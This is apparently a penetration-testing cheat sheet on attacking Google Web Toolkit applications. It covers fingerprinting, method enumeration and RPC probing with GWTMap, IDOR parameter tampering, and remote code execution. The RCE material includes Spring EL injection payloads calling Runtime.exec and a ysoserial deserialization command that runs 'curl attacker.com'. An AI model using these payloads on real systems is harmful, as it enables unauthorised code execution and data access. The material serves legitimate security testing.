# Google Web Toolkit (GWT)

## Description
Google Web Toolkit (GWT) is a development toolkit for building complex browser-based applications. GWT applications use Remote Procedure Calls (RPC) for client-server communication. Security vulnerabilities can arise from improper handling of serialized objects, method exposure, and Expression Language (EL) injection.

## GWT Architecture

```
Client (JavaScript) <--RPC--> Server (Java)
```

- Client sends serialized RPC requests
- Server processes and returns serialized responses
- Serialization format is GWT-specific

## Identification

### GWT Fingerprints
```
# Look for these in page source:
*.nocache.js
*.cache.js
*.gwt.rpc
/<app>/<app>.nocache.js
```

### HTTP Headers
```http
Content-Type: text/x-gwt-rpc; charset=utf-8
```

### Request Format
```
7|0|4|http://target.com/app/|ABC123|service.ServiceName|methodName|...
```

## Enumeration Techniques

### 1. Bootstrap File Analysis

The `.nocache.js` file contains information about available permutations:

```javascript
// Extract from nocache.js
var strongName = '<hash>.cache.js';
// These files contain service definitions
```

### 2. Method Enumeration

Using GWTMap to enumerate available methods:

```bash
# Backup remote application code
./gwtmap.py -u "http://target.com/app/app.nocache.js" --backup

# Enumerate methods
./gwtmap.py -u "http://target.com/app/app.nocache.js" --enum

# Filter specific service
./gwtmap.py -u "http://target.com/app/app.nocache.js" --filter "UserService"
```

### 3. Service Discovery

```bash
# List available services
./gwtmap.py -u "http://target.com/app/app.nocache.js" --services

# Output example:
# - UserService
# - AdminService
# - DataService
```

## Exploitation Techniques

### 1. RPC Payload Generation

```bash
# Generate RPC payload for specific method
./gwtmap.py -u "http://target.com/app/app.nocache.js" \
    --rpc \
    --service "UserService" \
    --method "getUser" \
    --params "1"

# Probe methods for vulnerabilities
./gwtmap.py -u "http://target.com/app/app.nocache.js" \
    --filter "AdminService" \
    --rpc \
    --probe
```

### 2. Through HTTP Proxy

```bash
# Route through Burp Suite
./gwtmap.py -u "http://target.com/app/app.nocache.js" \
    --rpc \
    --probe \
    --proxy "http://127.0.0.1:8080"
```

### 3. Expression Language (EL) Injection

GWT applications using Spring may be vulnerable to EL injection:

```
# EL Injection payload in serialized data
${7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}

# Spring EL Injection
#{T(java.lang.Runtime).getRuntime().exec('whoami')}
```

### 4. Deserialization Attacks

GWT-RPC serialization can be vulnerable:

```bash
# Generate deserialization payload
# Requires knowledge of server-side libraries
ysoserial.jar CommonsCollections1 'command'
```

## Tools

### GWTMap
```bash
# https://github.com/nickmakesstuff/GWTMap

# Full scan
./gwtmap.py -u "http://target.com/app/app.nocache.js" --backup --enum --probe

# With authentication
./gwtmap.py -u "http://target.com/app/app.nocache.js" \
    --cookie "JSESSIONID=abc123" \
    --enum
```

### GWT-Penetration-Testing-Toolset
```bash
# https://github.com/nickmakesstuff/GWT-Penetration-Testing-Toolset

# Parse GWT-RPC requests
python gwtparse.py request.txt
```

### Burp Extensions
```
- GWT4Burp
- SerializedPayloadGenerator
```

## Manual Testing

### 1. Capture RPC Request
```http
POST /app/service HTTP/1.1
Host: target.com
Content-Type: text/x-gwt-rpc; charset=utf-8

7|0|4|http://target.com/app/|ABC123|com.app.service.UserService|getUser|I|1|
```

### 2. Analyze Request Format
```
7                       # Protocol version
|0                      # Flags
|4                      # String table size
|http://target.com/app/ # Module base URL
|ABC123                 # Strong name hash
|com.app.service.UserService # Service interface
|getUser                # Method name
|I                      # Parameter type (Integer)
|1                      # Parameter value
```

### 3. Modify and Replay
```bash
# Change parameter values
# Try different user IDs
# Test for IDOR vulnerabilities
```

## Common Vulnerabilities

### 1. Exposed Admin Methods
```java
// Server-side method that should be protected
public void deleteUser(int userId) {
    // No authorization check
    userDAO.delete(userId);
}
```

### 2. Information Disclosure
```bash
# Enumerate all available methods
# Discover hidden/admin functionality
# Extract sensitive information from responses
```

### 3. Parameter Tampering
```
# Original: |1| (user ID 1)
# Tampered: |2| (user ID 2 - IDOR)
```

### 4. Deserialization RCE
```bash
# If vulnerable libraries present
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com'
```

## Testing Checklist

- [ ] Identify GWT application (nocache.js, cache.js)
- [ ] Extract and backup client-side code
- [ ] Enumerate available services and methods
- [ ] Map authentication requirements
- [ ] Test for IDOR via parameter manipulation
- [ ] Check for EL injection in inputs
- [ ] Test for deserialization vulnerabilities
- [ ] Analyze error messages for info disclosure

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Google%20Web%20Toolkit
- https://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html
- https://thehackerish.com/hacking-a-google-web-toolkit-application/
